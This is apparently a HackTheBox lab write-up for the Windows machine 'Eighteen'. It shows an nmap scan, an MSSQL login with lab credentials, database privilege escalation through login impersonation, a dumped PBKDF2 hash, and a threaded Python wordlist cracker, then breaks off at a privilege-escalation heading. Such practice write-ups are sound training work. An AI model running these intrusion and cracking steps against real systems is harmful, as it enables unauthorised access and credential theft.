---
layout: post
title: "Eighteen Writeup - Hackthebox"
date: 2025-11-20
categories: [Hackthebox,Windows]
tags: [windows]
toc: true
---

# HackTheBox - Eighteen Writeup


## Detailed Reconnaissance

We begin with a comprehensive Nmap scan to identify open ports and services:

```bash
nmap -sCV -p- 10.10.11.95 --min-rate=1000 -Pn
```

**Findings:**
- **Port 80**: Microsoft IIS 10.0 web server, redirecting to `eighteen.htb`
- **Port 1433**: Microsoft SQL Server 2022 with detailed version information
- **Port 5985**: WinRM service for remote management

The SQL Server instance reveals significant information through the Nmap scan:
- Domain: `EIGHTEEN`
- Computer Name: `DC01.eighteen.htb`
- Windows Server 2025 Datacenter build

## Initial Foothold - SQL Server Compromise

The first entry point is through the SQL Server using discovered credentials:

```bash
impacket-mssqlclient -debug eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.10.11.95
```

**Initial Enumeration:**
We check our permissions and available logins:

```sql
SELECT @@version;
SELECT name FROM master.sys.server_principals;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

The user `kevin` has limited permissions but can execute as another user `appdev`. This becomes our privilege escalation vector within the database context.

**Database Exploration:**
```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT name FROM sys.tables;
SELECT * FROM users;
```

We discover a `financial_planner` database containing a `users` table with an administrator account and a password hash. The hash uses PBKDF2 with SHA256, indicating modern password hashing.

## Password Cracking and Web Application Access

The discovered hash:
```
pbkdf2:sha256:600000$qKbwFRwtyPhZGE1I$1d75a3175bece3f8fa91d2da91f31fa4bd9eafc1c44041e32809f477463b81f1
```

```python
import hashlib
import threading
from queue import Queue

hash_to_crack = "hash" # change
parts = hash_to_crack.split('$')
algorithm_iterations = parts[0]
salt = parts[1]
target_hash = parts[2]

iterations = int(algorithm_iterations.split(':')[-1])

wordlist_path = "/home/kali/Documents/wordlist/rockyou.txt"

queue = Queue()
num_threads = 100
found = False
lock = threading.Lock()

def worker():
    global found
    while not queue.empty() and not found:
        password = queue.get().strip()
        hashed_password = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode(),
            salt.encode(),
            iterations
        ).hex()
        if hashed_password == target_hash:
            with lock:
                found = True
                print(f"[+] Password found: {password}")
        queue.task_done()

def main():
    global found
    print("[*] Loading wordlist and starting threads...")

    try:
        with open(wordlist_path, "r", encoding="latin-1") as wordlist:
            for line in wordlist:
                queue.put(line.strip())

        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            threads.append(t)
            t.start()

        queue.join()

        if not found:
            print("[-] Password not found in the wordlist.")
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")

if __name__ == "__main__":
    main()
```

Using a custom Python cracking script with rockyou wordlist, we successfully crack the password to `admin`


## Privilege Escalation - dMSA Attack with BadSuccessor

...